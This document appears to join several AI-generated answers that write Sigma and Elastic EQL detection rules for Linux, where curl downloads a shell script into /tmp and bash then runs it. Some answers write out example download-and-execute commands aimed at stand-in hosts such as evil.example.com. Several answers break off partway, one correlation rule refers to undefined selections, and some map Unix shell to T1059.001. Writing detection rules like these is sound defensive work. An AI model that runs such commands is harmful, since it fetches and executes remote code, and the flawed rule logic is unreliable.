text:
Below is a practical host-based detection rule for Linux process telemetry. It detects the classic pattern where `curl` writes/downloads a shell script into `/tmp`, then within a short window `bash` or `sh` executes a script from `/tmp`.

Because the requirement is “followed by,” the cleanest implementation is an event-sequence rule. First, an Elastic/EQL example is provided because EQL natively supports `sequence ... followed by`. After that, Sigma component rules are included for platforms that support temporal correlation.

## Rule logic

```text
Within 5 minutes on the same host:

1. A curl process starts and appears to download/write a shell script into /tmp
   Common indicators:
     - curl -o /tmp/...
     - curl --output /tmp/...
     - curl -O ... while working directory is /tmp
     - curl ... > /tmp/...
   The command usually contains a remote URL such as http://, https://, ftp://, file://

2. A bash or sh process starts and executes a file located in /tmp
   Common indicators:
     - bash /tmp/....sh
     - sh /tmp/....sh
     - bash -c /tmp/....sh
     - sh -c "/tmp/....sh"
```

MITRE ATT&CK mapping:

```text
T1105 - Ingress Tool Transfer
T1059.004 - Command and Scripting Interpreter: Unix Shell
```

---

## Elastic EQL detection rule

This rule uses `process_start` / `process-started` events. Field names may need minor tuning depending on your telemetry source.

```eql
// Malicious file download and execution:
// curl downloads/writes a bash script to /tmp, followed by bash/sh executing it.
//
// Log source: Linux process creation/start events
// Correlation: same host within 5 minutes
// MITRE: T1105, T1059.004

sequence by host.id with maxspan=5m
  [
    process where event.action == "process-started"
      and process.name == "curl"

      // Curl writes/downloads to /tmp.
      // Covers:
      //   curl -o /tmp/...
      //   curl --output /tmp/...
      //   curl -O with cwd /tmp
      //   curl ... > /tmp/...
      and (
        (
          (process.args == "-o" or process.args == "--output")
          and
          (
            process.args : "/tmp/*"
            or process.args : "*/tmp/*"
          )
        )

        or

        (
          process.args : "--output=/tmp/*"
          or process.args : "*/tmp/*"
          or process.args : "-o=/tmp/*"
        )

        or

        (
          (process.args == "-O" or process.args == "--remote-name")
          and
          (
            process.working_directory : "/tmp"
            or process.working_directory : "/tmp/*"
            or process.working_directory : "*/tmp/*"
          )
        )

        or

        (
          process.command_line : "*curl* -o /tmp/*"
          or process.command_line : "*curl* --output /tmp/*"
          or process.command_line : "*curl* --output=/tmp/*"
          or process.command_line : "*curl* > /tmp/*"
        )
      )

      // Require some evidence of remote retrieval.
      // Remove or broaden this condition if local-file staging should also be detected.
      and (
        process.args : "*http*"
        or process.args : "*https*"
        or process.args : "*ftp*"
        or process.args : "*file*"
        or process.command_line : "*http*"
        or process.command_line : "*https*"
        or process.command_line : "*ftp*"
        or process.command_line : "*file*"
      )
  ]

  [
    process where event.action == "process-started"
      and (process.name == "bash" or process.name == "sh")

      // Bash/sh executes a script located in /tmp.
      and (
        process.args : "/tmp/*.sh"
        or process.args : "*/tmp/*.sh"

        or

        (
          process.args == "-c"
          and
          (
            process.args : "/tmp/*.sh"
            or process.args : "*/tmp/*.sh"
          )
        )

        or

        process.command_line : "*bash* /tmp/*.sh"
        or process.command_line : "*sh* /tmp/*.sh"
        or process.command_line : "*bash -c* /tmp/*.sh"
        or process.command_line : "*sh -c* /tmp/*.sh"
      )
  ]
```

### Notes for the EQL rule

- If your platform does not normalize process names, replace:

```eql
process.name == "curl"
```

with something equivalent like:

```eql
process.name : "*curl"
```

or use `process.executable : "*curl"`.

- For broader coverage, remove the `.sh` extension requirement from the execution step. That increases coverage but also increases false positives.
- For higher fidelity, if your platform can parse the exact target file path from both steps, correlate by the same `/tmp/<script>.sh` filename instead of just by host.

---

## Sigma-compatible component rules

Classic Sigma rules do not natively express “event A followed by event B” unless your SIEM or Sigma implementation supports temporal correlation. Use the two component rules below and correlate them by host within 5 minutes.

---

### Sigma rule 1: Curl writes/downloads a script to /tmp

```yaml
title: Curl Downloads Bash Script to /tmp
id: 2e9c4f6a-7f91-4b4c-8d56-0d6f2d6f5d3e
status: experimental
description: >
  Detects curl writing or downloading files to /tmp, commonly used by malware to
  stage shell scripts before execution.
references:
  - https://attack.mitre.org/techniques/T1105/
logsource:
  category: process_creation
  product: linux
detection:
  curl_process:
    Image|endswith:
      - '/curl'
      - '/bin/curl'
      - '/usr/bin/curl'

  curl_output_to_tmp:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
    CommandLine|contains:
      - ' -o '
      - ' -o='
      - ' --output '
      - '--output='
      - ' -O '
      - ' --remote-name '

  curl_remote_name_with_tmp_cwd:
    Image|endswith:
      - '/curl'
      - '/bin/curl'
      - '/usr/bin/curl'
    CommandLine|contains:
      - ' -O '
      - ' --remote-name '
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'
      - 'file://'
    Cwd|startswith: '/tmp/'

  condition: curl_process and (curl_output_to_tmp or curl_remote_name_with_tmp_cwd)

falsepositives:
  - Legitimate installers
  - Developer tooling
  - Package build scripts
  - CI/CD pipelines that intentionally stage files under /tmp

level: medium
tags:
  - attack.command-and-control
  - attack.t1105
```

---

### Sigma rule 2: Bash or sh executes a script from /tmp

```yaml
title: Bash or Sh Executes Script From /tmp
id: 9c4f1e56-7b1d-4f51-a2d7-0f8f7f2c2c11
status: experimental
description: >
  Detects bash or sh executing a shell script located under /tmp. Attackers often
  stage malicious scripts in writable temporary directories and immediately execute them.
references:
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  category: process_creation
  product: linux
detection:
  shell_process:
    Image|endswith:
      - '/bash'
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/sh'
      - '/bin/sh'
      - '/usr/bin/sh'

  tmp_script_execution:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: shell_process and tmp_script_execution

falsepositives:
  - Administrative scripts executed from /tmp
  - Cron jobs
  - Package post-install scripts
  - Developer debugging scripts

level: medium
tags:
  - attack.execution
  - attack.t1059.004
```

---

## Temporal correlation requirement

To turn the two Sigma component rules into the intended “download-and-execute” detection, correlate them using the following logic:

```text
Rule 1:
  curl writes/downloads /tmp script
  AND Rule 2:
  bash/sh executes /tmp script
  SAME HOST
  WITHIN 5 MINUTES
```

If your Sigma engine supports correlation rules, the correlation parameters would look conceptually like this:

```text
Correlation type: temporal
Group by: host.name
Time window: 5 minutes
Rule A: curl writes/downloads /tmp script
Rule B: bash/sh executes /tmp script
```

---

## Tuning and operational considerations

### Reduce false positives

Common benign patterns to allow-list or suppress when appropriate:

```text
/tmp/snapshots/
/tmp/install*
/tmp/tmp*
/tmp/.cache/
/tmp/.apt*
/tmp/rpm*
/tmp/dnf*
/tmp/yum*
/tmp/pip*
/tmp/npm*
/tmp/ansible*
/tmp/docker*
/tmp/kubectl*
```

You may also exclude known package managers, container runtimes, build systems, or administrative scripts depending on your environment.

### Improve fidelity

If your telemetry includes file-system events, the strongest version of this rule is:

```text
1. curl creates or writes /tmp/<name>.sh
2. bash or sh executes the exact same /tmp/<name>.sh file
```

That removes cases where one host event is unrelated to the other.

### Coverage caveat

This rule focuses on download-to-`/tmp` followed by execution. Some malware uses pipe-to-shell techniques such as:

```bash
curl http://malicious.example/payload.sh | bash
```

That pattern does not necessarily create a script in `/tmp` first. Consider adding a companion rule for `curl ... | bash`, `wget ... | bash`, or remote-script pipe-to-shell behavior.

text:
Below is a portable **Sigma correlation rule** for Linux process telemetry. It assumes the SIEM provides process-creation events with fields such as `Image`, `CommandLine`, `Host`, and `TimeCreated`. Field names may need slight adjustment depending on your data source.

```yaml
title: Malicious Bash Script Download via curl to /tmp Followed by Execution
id: 3d7c8f1e-7a4c-4c3a-b2d7-6f31e7d95f6d
status: experimental
description: |
  Detects a curl process downloading or writing a Bash script to /tmp, followed by
  execution of that script by bash/sh. This is a classic Linux download-and-execute
  malware delivery pattern.

  Also detects some wrapper variants where bash -c invokes curl followed by execution
  of a /tmp script.

  Tuning note: If your SIEM supports regex extraction, correlate on both Host and the
  extracted script path for higher fidelity.

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineering
date: 2026-06-14
tags:
  - attack.command-and-control
  - attack.execution
  - attack.t1105
  - attack.t1059.004

logsource:
  product: linux
  category: process_creation

detection:
  # First event: curl creates/downloads a Bash script under /tmp
  curl_download:
    Image|endswith:
      - '/curl'
    CommandLine|re:
      - '(?i)(?:^|\s)(?:-o|--output)(?:\s+|=)(/tmp/[^\s"]+\.sh)(?:[\s"]|$)'
      - '(?i)(?:^|\s)>\s*(/tmp/[^\s"]+\.sh)(?:[\s"]|$)'
      - '(?i)curl\b.*https?://[^\s]+.*(?:-o|--output)[^\n]*?/tmp/[^\s"]+\.sh.*[|]\s*(?:bash|sh)(?:[\s"]|$)'

  # Second event: bash/sh executes a script from /tmp
  bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re:
      - '(?i)(?:bash|sh)\b.*?(/tmp/[^\s"]+\.sh)(?:[\s"]|$)'
      - '(?i)(?:bash|sh)\s+-c\b.*(?:curl\b.*(?:-o|--output)[^\n]*?/tmp/[^\s"]+\.sh|curl\b.*https?://.*[|]\s*(?:bash|sh)).*'
      - '(?i)(?:bash|sh)\b.*?(?:&&|;|\.\s)(?:bash|sh)\s+/tmp/[^\s"]+\.sh(?:[\s"]|$)'

  condition: curl_download or bash_execution

correlation:
  type: temporal
  rules:
    - curl_download
    - bash_execution
  timespan: 5m
  condition: bash_execution
  group-by:
    - Host

fields:
  - Host
  - Image
  - CommandLine
  - ParentCommandLine
  - TimeCreated

falsepositives:
  - Legitimate installer scripts that download to /tmp and execute, such as Docker,
    Kubernetes, or CI tooling installers.
  - Administrative or update automation that uses curl and executes temporary shell
    scripts.
  - Security scanning tools that download scripts into temporary locations.
  - Developer build/test automation that uses temporary shell scripts.

level: high
```

## If you want a simpler “single-event” variant

Some environments cannot do temporal correlation. In that case, you can use this narrower rule that detects direct parent-child or chained-command execution:

```yaml
title: Curl Download to /tmp and Execution of Bash Script by Parent or Chained Command
id: 7a2f618d-b5d2-4f2d-8f9c-5f9d2c2d6f11
status: experimental
description: |
  Detects bash/sh executing a /tmp Bash script whose parent command line or wrapper
  command line indicates a curl download to /tmp, or detects curl followed by bash
  in one chained command.
logsource:
  product: linux
  category: process_creation
detection:
  parent_curl_download:
    Image|endswith:
      - '/bash'
      - '/sh'
    ParentCommandLine|re:
      - '(?i)curl\b.*(?:-o|--output)(?:\s+|=)(/tmp/[^\s"]+\.sh)'
      - '(?i)curl\b.*>\s*(/tmp/[^\s"]+\.sh)'
      - '(?i)curl\b.*https?://.*[|]\s*(?:bash|sh)'
    CommandLine|re:
      - '(?i)(?:bash|sh)\b.*?/tmp/[^\s"]+\.sh(?:[\s"]|$)'
  chained_command:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re:
      - '(?i)(?:bash|sh)\s+-c\b.*(?:curl\b.*(?:-o|--output)[^\n]*?/tmp/[^\s"]+\.sh.*(?:&&|;|\.\s)(?:bash|sh)\s+/tmp/[^\s"]+\.sh|curl\b.*https?://.*[|]\s*(?:bash|sh)).*'
  condition: parent_curl_download or chained_command
falsepositives:
  - Legitimate installers and automation scripts that download temporary shell scripts.
level: high
```

## Elastic EQL alternative

If your stack is Elastic, this sequence rule may be easier to deploy:

```eql
sequence by host.id with maxspan=5m
  [process where host.os.type == "linux" and event.action in ("exec", "execve") and process.name == "curl" and
    (
      (process.args == "-o" and process.args: "/tmp/*.sh")
      or (process.args == "--output" and process.args: "/tmp/*.sh")
      or process.command_line: "* -o /tmp/*.sh*"
      or process.command_line: "* --output /tmp/*.sh*"
      or process.command_line: "* > /tmp/*.sh*"
    )
  ]
  [process where host.os.type == "linux" and event.action in ("exec", "execve") and process.name in ("bash", "sh") and
    (
      process.args: "/tmp/*.sh"
      or process.command_line: "* /tmp/*.sh*"
    )
  ]
```

### Optional broader variant

To catch direct `curl | bash` download-and-execute without writing a file to `/tmp`, add this as a separate detection rule:

```eql
sequence by host.id with maxspan=5m
  [process where host.os.type == "linux" and event.action in ("exec", "execve") and process.name == "curl" and
    (
      process.command_line: "*https://*"
      or process.command_line: "*http://*"
    )
  ]
  [process where host.os.type == "linux" and event.action in ("exec", "execve") and process.name in ("bash", "sh") and
    process.parent.name == "sh" and

text:
Below is a practical detection rule set for **Linux process creation** telemetry. The most reliable implementation is a **two-step correlation**, because `curl` usually does not spawn `bash` directly; both commands often run as sibling commands or as part of the same parent shell.

## 1. Sigma-style rule set

### Rule 1: `curl` downloads a script into `/tmp`

```yaml
title: Curl Downloads Bash Script to /tmp
id: 8a413f6d-69d4-4a73-86e5-8e3a69f2c111
status: experimental
description: >
  Detects curl downloading a Bash script into /tmp using -o/--output.
  This is often seen with download-and-execute malware or post-exploitation tooling.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Security
date: 2026-06-15
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection_curl_process:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/bin/curl'
      - '/usr/local/bin/curl'

  selection_http_url:
    CommandLine|re: '(?i)https?://'

  selection_writes_to_tmp:
    CommandLine|re: '(?i)(?:-o|--output)\s*=?\s*.*?/tmp/[^\s]+'

  condition: selection_curl_process and selection_http_url and selection_writes_to_tmp

fields:
  - Host.Name
  - User.Name
  - Image
  - CommandLine
  - ParentImage
  - ParentCommandLine

falsepositives:
  - Legitimate software installs
  - Package manager post-install scripts
  - Admin scripts
  - CI/CD pipelines that download payloads to /tmp
level: medium
```

### Rule 2: `bash` executes a file from `/tmp`

```yaml
title: Bash Executes Script From /tmp
id: 3f49d90b-8371-43a6-8d09-33f742117d1d
status: experimental
description: >
  Detects bash executing a file path located under /tmp.
  This is commonly used to run scripts downloaded by malware.
references:
  - https://attack.mitre.org/techniques/T1059/004/
author: Security
date: 2026-06-15
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection_bash_process:
    Image|endswith:
      - '/bash'
      - '/usr/bin/bash'
      - '/bin/bash'
      - '/usr/local/bin/bash'

  selection_executes_from_tmp:
    CommandLine|contains: '/tmp/'

  condition: selection_bash_process and selection_executes_from_tmp

fields:
  - Host.Name
  - User.Name
  - Image
  - CommandLine
  - ParentImage
  - ParentCommandLine

falsepositives:
  - Legitimate scripts executed from /tmp
  - Application temp files launched via bash
level: medium
```

### Correlation rule

Alert when both rules fire on the same host and user within a short window, preferably 5 minutes.

```yaml
title: Download-and-Execute Pattern: Curl Downloads Script to /tmp Then Bash Executes /tmp File
type: correlation
correlation:
  type: event_count
  rules:
    - 'Curl Downloads Bash Script to /tmp'
    - 'Bash Executes Script From /tmp'
  timespan: 5m
  group-by:
    - Host.Name
    - User.Name
```

If your SIEM does not support Sigma-native correlation, implement the same logic manually:

- Find `curl` process events matching Rule 1.
- Find `bash` process events matching Rule 2.
- Join by `host.name` and `user.name` within 5 minutes.
- Optionally require that the executed `/tmp` filename matches the downloaded `/tmp` filename.

---

## 2. Elastic EQL sequence rule

If your environment is Elastic, this is a single implementation-agnostic sequence rule.

```eql
sequence with maxspan=5m
  [process where host.os.type == "linux" and event.type == "start"
    and process.name == "curl"
    and command_line ~= r'''(?i)(?:-o|--output)\s*=?\s*.*?/tmp/[^\s]+'''
    and command_line ~= r'''(?i)https?://'''
    by host.name, user.name
  ]
  [process where host.os.type == "linux" and event.type == "start"
    and process.name == "bash"
    and command_line ~= r'''/tmp/[^\s]+'''
    by host.name, user.name
  ]
```

More precise version requiring a `.sh` or `.bash` script hint:

```eql
sequence with maxspan=5m
  [process where host.os.type == "linux" and event.type == "start"
    and process.name == "curl"
    and command_line ~= r'''(?i)(?:-o|--output)\s*=?\s*.*?/tmp/[^\s]+(?:\.(?:sh|bash))?'''
    and command_line ~= r'''(?i)https?://'''
    by host.name, user.name
  ]
  [process where host.os.type == "linux" and event.type == "start"
    and process.name == "bash"
    and command_line ~= r'''/tmp/[^\s]+(?:\.(?:sh|bash))?'''
    by host.name, user.name
  ]
```

---

## 3. Tuning and bypass considerations

### To reduce false positives:

- Require the downloaded file path to include `.sh` or `.bash`:

```regex
(?:-o|--output)\s*=?\s*.*?/tmp/[^\s]+\.(?:sh|bash)
```

- Require both events to reference the **same filename** under `/tmp`:

```text
curl -o /tmp/payload.sh ...
bash /tmp/payload.sh
```

- Add legitimate exclusions only if needed, for example known update or deployment scripts:

```yaml
filter:
  ParentImage|endswith:
    - '/apt-get'
    - '/yum'
    - '/dnf'
    - '/dpkg'
  CommandLine|contains:
    - 'letsencrypt'
    - 'apt-key'
```

### To improve coverage:

- `curl` may redirect output using a parent shell instead of `-o`:

```bash
curl http://evil.example.com/payload.sh > /tmp/payload.sh
bash /tmp/payload.sh
```

If your endpoint logs include file creation or process file-write events, correlate:

```text
process.image == curl
file.path startswith /tmp/
file.name endswith .sh
```

then:

```text
process.image == bash
command_line contains /tmp/<same_path>
```

- If using parent command-line telemetry, also detect inline command chains:

```bash
bash -c 'curl http://evil.example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh'
```

For that scenario, a useful detection is:

```yaml
title: Bash Executes Inline Curl Download-and-Execute Pattern
logsource:
  product: linux
  category: process_creation
detection:
  selection_bash:
    Image|endswith: '/bash'

  selection_inline_download_execute:
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - 'http'

    CommandLine|re:
      - '(?i)(?:-o|--output|>)\s*=?\s*.*?/tmp/[^\s]+'
      - '(?i)(?:bash|sh|source)\s+.*?/tmp/[^\s]+'

  condition: selection_bash and selection_inline_download_execute
```

---

## 4. Summary

A good detection for this objective should:

1. Detect `curl` downloading to `/tmp` using `-o` or `--output`.
2. Detect `bash` executing a file path from `/tmp`.
3. Correlate both events by host and user, ideally within 5 minutes.
4. Avoid requiring `curl` to be the parent of `bash`.
5. Prefer matching the same `/tmp` filename where possible to reduce false positives.

text:
Below is a Linux endpoint detection rule for the classic **download-and-execute** pattern:

1. `curl` downloads or writes a bash script into `/tmp`.
2. `bash` executes a script from `/tmp`.
3. The two events occur on the same host within a short time window.

This can be implemented as a Sigma-style sequence/correlation rule on Linux EDR/SIEM platforms that support process creation events.

```yaml
title: Malicious Download and Execution - curl to /tmp Bash Script Followed by Bash Execution
id: 5f7c19e6-27f0-4f63-91d0-7f33d6b7e7a1
status: experimental
description: |
  Detects a two-step malicious delivery pattern on Linux endpoints:
  1. A curl process downloads or writes a bash script to /tmp using -o/--output.
  2. A bash process executes a script from /tmp within a short time window.
  This is characteristic of classic download-and-execute malware droppers.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.001
  - attack.t1105
logsource:
  product: linux
  category: process_creation
detection:
  curl_download_to_tmp_script:
    selection:
      Image|endswith:
        - '/curl'
      CommandLine|contains|all:
        - '/tmp/'
        - '.sh'
      CommandLine|contains|any:
        - '-o'
        - '--output'
    condition: selection

  bash_exec_tmp_script:
    selection:
      Image|endswith:
        - '/bash'
      CommandLine|contains|all:
        - '/tmp/'
        - '.sh'
    condition: selection

  sequence:
    type: correlation
    method: correlation
    rules:
      - curl_download_to_tmp_script
      - bash_exec_tmp_script
    timeframe: 60s
    groupby:
      - host.name
    condition: count > 1

falsepositives:
  - Legitimate installers, update tools, CI/CD agents, or administration scripts that download helper scripts to /tmp and execute them.
  - Developer tooling that uses /tmp for temporary shell scripts.

level: high
```

## Tuning notes

For higher fidelity, correlate on the exact script path, not just host + time.

Use the following regex to extract the script path from the process command line:

```regex
(?i)(/tmp/[^\s"']+\.(?:sh|bash))
```

Recommended implementation logic:

```text
event_type = curl AND command_line matches regex output path -> /tmp/*.sh
event_type = bash AND command_line matches same /tmp/*.sh path
event2.timestamp > event1.timestamp
event2.timestamp - event1.timestamp <= 60s
host = same
script_path = same
```

If your Sigma backend does not support sequence correlation, deploy the two detection rules separately and correlate them in your SIEM/EDR platform using:

- Same `host`
- Same extracted `/tmp/*.sh` path
- `bash` execution event occurring after the `curl` download event
- Within 60 seconds

## Optional stronger variant

If file-creation events are available, prefer this pattern:

```yaml
curl_file_write_tmp_script:
  category: file_event
  selection:
    Image|endswith:
      - '/curl'
    TargetFilename|startswith:
      - '/tmp/'
    TargetFilename|endswith:
      - '.sh'
  condition: selection
```

Then correlate:

```text
curl file_event creates /tmp/*.sh
  followed by
bash process_event executes /tmp/*.sh
```

This reduces false positives compared to relying only on command-line matching.

text:
Below is a portable detection rule set for Linux. It uses two process-creation rules plus a temporal/correlation rule so the alert fires only when a `curl` download to `/tmp` is followed by `bash` execution of a script from `/tmp`.

```yaml
title: Curl Downloads Bash Script To /tmp
id: 1d765a57-25d9-4b59-b991-13f343d52199
status: experimental
description: >
  Detects curl writing or retrieving a bash script into /tmp.
  This is the download stage of classic malware delivery.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image:
      - 'curl'
      - '/usr/bin/curl'
      - '/bin/curl'
  selection_tmp_script:
    CommandLine:
      - '* -o /tmp/*.sh*'
      - '* --output /tmp/*.sh*'
      - '* -o /tmp/*.bash*'
      - '* --output /tmp/*.bash*'
      - '* > /tmp/*.sh*'
      - '* > /tmp/*.bash*'
      - '* /tmp/*.sh*'
      - '* /tmp/*.bash*'
  filter_packagers:
    ParentCommandLine:
      - '*apt*'
      - '*apt-get*'
      - '*dpkg*'
      - '*yum*'
      - '*dnf*'
      - '*zypper*'
      - '*pacman*'
      - '*snap*'
      - '*flatpak*'
      - '*cargo*'
      - '*pip*'
      - '*gem*'
  condition: selection_image and selection_tmp_script and not filter_packagers
falsepositives:
  - 'Legitimate installation scripts, package manager hooks, CI/CD jobs, and developer helpers.'
level: high
```

```yaml
title: Bash Executes Script From /tmp
id: 2a73e7d9-a315-4b54-97d0-51a0453b9d7c
status: experimental
description: >
  Detects bash executing a script located in /tmp.
  This is the execution stage of download-and-execute malware.
references:
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image:
      - 'bash'
      - '/bin/bash'
      - '/usr/bin/bash'
  selection_tmp_script:
    CommandLine:
      - '* /tmp/*.sh*'
      - '* /tmp/*.bash*'
      - '* -c * /tmp/*.sh*'
  filter_packagers:
    ParentCommandLine:
      - '*apt*'
      - '*apt-get*'
      - '*dpkg*'
      - '*yum*'
      - '*dnf*'
      - '*zypper*'
      - '*pacman*'
      - '*snap*'
      - '*flatpak*'
      - '*cargo*'
      - '*pip*'
      - '*gem*'
  filter_common_scripts:
    CommandLine:
      - '* /tmp/postinst*'
      - '* /tmp/preinst*'
      - '* /tmp/configure*'
      - '* /tmp/build*'
      - '* /tmp/test*'
  condition: selection_image and selection_tmp_script and not (filter_packagers or filter_common_scripts)
falsepositives:
  - 'Installer scripts, developer workflows, and temporary test scripts.'
level: medium
```

```yaml
title: Malicious Curl Download To /tmp Followed By Bash Execution
id: 3d89137c-9c74-421f-91b4-611d6f996303
status: experimental
category: correlation
description: >
  Correlates curl downloading a bash script to /tmp with subsequent bash
  execution of that script, indicating classic download-and-execute malware.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
detection:
  selection:
    curl_download: 1d765a57-25d9-4b59-b991-13f343d52199
    bash_execution: 2a73e7d9-a315-4b54-97d0-51a0453b9d7c

    ParentCommandLine:
      - '*apt*'

      - '*dpkg*'
      - '*yum*'
      - '*dnf*'
      - '*snap*'
      - '*flatpak*'
      - '*pacman*'
  condition: (selection_pipe or selection_chain) and not filter_packagers
falsepositives:
  - 'Installers, bootstrap scripts, and developer tools that fetch helper scripts.'
level: high
```

text:
Below is a practical detection rule for the described **curl → /tmp bash script → bash execution** pattern. I am providing it as a **Sigma rule set** for Linux Sysmon/EDR, plus a concise **Elastic EQL** sequence alternative.

The Sigma implementation is a **temporal correlation rule**: it requires a `curl` download/create event followed by a `bash` execution event on the same host.

---

## Detection Logic Summary

Alert when, on the same Linux host, within approximately **5 minutes**:

1. A `curl` process creates or downloads a Bash script into `/tmp`.
   - Example file path: `/tmp/x.sh`, `/tmp/payload.sh`
   - Example command line: `curl ... -o /tmp/x.sh`
2. A `bash` process executes that script.
   - Example command line: `bash /tmp/x.sh`

This matches classic Linux malware delivery behavior: **ingress tool transfer / download-and-execute**.

MITRE ATT&CK references:

- `T1105` Ingress Tool Transfer
- `T1059.001` Command and Scripting Interpreter: Unix Shell
- `T1059.004` Command and Scripting Interpreter: Unix Shell

---

# Sigma Rule Set for Sysmon for Linux / EDR

> Uses both **ProcessCreate** and **FileCreate** events.  
> If your environment only provides process creation logs, use the single-event fallback below or the EQL alternative.

```yaml
# Component Rule 1: curl downloads or creates a Bash script in /tmp
title: Curl Downloads Bash Script to /tmp
id: 91566387-88d9-4e3e-a3e5-b7b7c6191d32
status: experimental
description: >
  Detects curl creating a .sh file under /tmp using FileCreate events,
  or downloading/copying a file to /tmp with a command-line output flag such as -o or --output.
references:
  - https://attack.mitre.org/techniques/T1105/
author: Security Engineering
date: 2026-06-22
logsource:
  product: linux
  service: sysmon
detection:
  selection_file_create:
    event_id: 11
    Image|endswith:
      - '/curl'
    TargetFilename:
      - '/tmp/*.sh'

  selection_command_output:
    event_id: 1
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_output_flag:
    event_id: 1
    Image|endswith:
      - '/curl'
    CommandLine|contains:
      - '-o '
      - '-o='
      - '--output '
      - '--output='

  condition: selection_file_create or (selection_command_output and selection_output_flag)
fields:
  - Hostname
  - event_id
  - Image
  - CommandLine
  - TargetFilename
falsepositives:
  - Legitimate software installers
  - Update tools
  - Developer scripts
  - CI/CD jobs
  - Container entrypoint scripts
level: high
tags:
  - attack.t1105
  - attack.command_and_control
```

---

```yaml
# Component Rule 2: bash executes a script from /tmp
title: Bash Executes Bash Script From /tmp
id: 81558693-3554-453b-b12f-5d312d563f01
status: experimental
description: >
  Detects bash executing a script whose path is located under /tmp.
references:
  - https://attack.mitre.org/techniques/T1059/
author: Security Engineering
date: 2026-06-22
logsource:
  product: linux
  service: sysmon
detection:
  selection_bash_exec:
    event_id: 1
    Image|endswith:
      - '/bash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: selection_bash_exec
fields:
  - Hostname
  - event_id
  - Image
  - CommandLine
falsepositives:
  - Legitimate scripts stored in /tmp
  - Software installation scripts
  - Update/patching workflows
  - Administrative maintenance scripts
  - CI/CD pipelines using temporary working directories
level: high
tags:
  - attack.t1059.001
  - attack.execution
```

---

```yaml
# Correlation Rule: curl downloads/creates script in /tmp, then bash executes it
title: Malicious Download-and-Execute Curl to /tmp Bash Script Followed by Bash Execution
id: 7d825498-7b3a-4d37-8175-79e6c3f2240f
status: experimental
description: >
  Detects the classic download-and-execute pattern where curl writes or downloads
  a Bash script to /tmp, followed shortly after by bash executing that script.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/
author: Security Engineering
date: 2026-06-22
logsource:
  product: linux
  service: sysmon
detection:
  selection_event_count:
    event_id:
      - 1
      - 11
  condition: selection_event_count

correlation:
  type: temporal_ordered
  rules:
    - 91566387-88d9-4e3e-a3e5-b7b7c6191d32
    - 81558693-3554-453b-b12f-5d312d563f01
  timeframe: 5m
  group-by:
    - Hostname

fields:
  - Hostname
  - event_id
  - Image
  - CommandLine
  - TargetFilename
falsepositives:
  - Legitimate installer scripts
  - Software update tools
  - Administrative scripts
  - CI/CD automation
  - Container runtime scripts
level: high
tags:
  - attack.t1059.001
  - attack.t1105
  - attack.execution
  - attack.command_and_control
```

---

# Single-Event Sigma Rule Fallback

If your SIEM/EDR does **not** support temporal correlation, you can detect the pattern when both `curl` and `bash` appear in the same chained command line.

Example:

```bash
bash -c "curl http://evil.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

```yaml
title: Curl Downloads and Executes Bash Script From /tmp via Chained Command Line
id: 069d3c8c-4c3d-4956-a731-b9761d47f184
status: experimental
description: >
  Detects a shell command that uses curl to download or write a script into /tmp
  and then immediately executes it with bash.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/
author: Security Engineering
date: 2026-06-22
logsource:
  product: linux
  service: sysmon
detection:
  selection_chain:
    event_id: 1
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - '.sh'
      - 'bash'

  selection_output_flag:
    CommandLine|contains:
      - '-o '
      - '-o='
      - '--output '
      - '--output='
      - '> /tmp/'
      - '>/tmp/'

  condition: selection_chain and selection_output_flag
fields:
  - Hostname
  - Image
  - CommandLine
falsepositives:
  - Legitimate installers using scripts in /tmp
  - Update tools
  - CI/CD automation
level: medium-high
tags:
  - attack.t1105
  - attack.t1059.001
```

---

# Elastic EQL Alternative

If you are using Elastic, EQL is well suited for this because it supports event sequences.

```kql
sequence by host.id with maxspan=5m
  [process where event.action == "exec" and process.name == "curl"
    and process.entry.command_line: ("* -o /tmp/*" or "* --output /tmp/*" or "* > /tmp/*")
    and process.entry.command_line: "*.sh*"
  ]
  [process where event.action == "exec" and process.name == "bash"
    and process.entry.command_line: ("/tmp/*.sh*" or "*/tmp/*.sh*")
  ]
```

You can make this more precise by adding user, file path, or process-tree context if your EDR populates those fields.

---

# Tuning Notes

1. **Adjust the timeframe**
   - Start with `5m`.
   - If malware sometimes delays execution, consider `30m` or `60m`, but expect more false positives.

2. **Reduce noise with file-path correlation**
